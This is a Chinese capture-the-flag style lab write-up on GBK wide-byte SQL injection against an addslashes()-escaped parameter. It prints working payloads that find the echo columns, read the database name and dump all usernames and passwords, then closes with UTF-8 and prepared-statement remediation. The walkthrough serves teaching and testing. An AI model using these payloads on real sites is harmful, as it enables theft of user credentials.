## 一、靶场信息
- **漏洞类型**：宽字节注入（Wide Byte Injection）。
- **防御机制**：后台使用 `addslashes()` 等函数对单引号进行了转义。
- **环境说明**：虽然官方导图提示为单引号加括号 `')`，但经本地实际测试，本关源码的闭合方式实为**纯单引号 `'`**。使用纯单引号 Payload 方能成功注入。

## 二、核心绕过思路（大白话解析）

这关的核心逻辑依然是“宽字节吃掉反斜杠”：
你输入 `%df`，后台强行转义变成 `%df%5c`，在 GBK 编码下，这俩拼成了一个汉字“運”，把反斜杠吃掉了。紧接着你输入的单引号（`%27`）就成功逃逸，打破了后台的限制。

## 三、详细操作步骤与 Payload 解析

### 第一步：探测回显点

**Payload：**
```text
?id=-1%df' union select 1,2,3 --+
```

**回显现象：**
页面显示数字 `2` 和 `3`，确认存在 3 列回显。

**大白话解析：**
*   **`-1%df'`**：`-1` 让原查询落空，`%df` 吃掉转义生成的反斜杠，最后的单引号 `'` 成功闭合后台语法。
*   **`union select 1,2,3`**：联合查询探测列数，强制数据库返回三列数据。
*   **`--+`**：注释符，把后台原本跟着的 `LIMIT 0,1` 注释掉。

### 第二步：爆当前数据库名

**Payload：**
```text
?id=-1%df' union select 1,database(),3 --+
```

**回显现象：**
页面 `Your Login name:` 后面显示 `security`。

**大白话解析：**
*   利用第 2 列回显位，把数字 `2` 替换成 `database()` 函数，直接把库名喊出来。

### 第三步：终极脱库（提取账号密码）

**Payload：**
```text
?id=-1%df' union select 1,group_concat(username,0x3a,password),3 from users --+
```

**回显现象：**
页面成功爆出所有账号密码，如 `Dumb:Dumb,Angelina...`。

**大白话解析：**
*   这一步直接冲进 `users` 表。
*   **`group_concat(username,0x3a,password)`**：把多行账号密码打包成一行，用冒号（`0x3a`）拼接显示。

## 四、核心防御机制（Remediation）
- **统一字符集**：将数据库和 Web 应用的字符集统一设置为 `UTF-8`，彻底杜绝宽字节注入。
- **预编译语句（PDO/MySQLi）**：参数化查询，彻底隔离代码与数据。
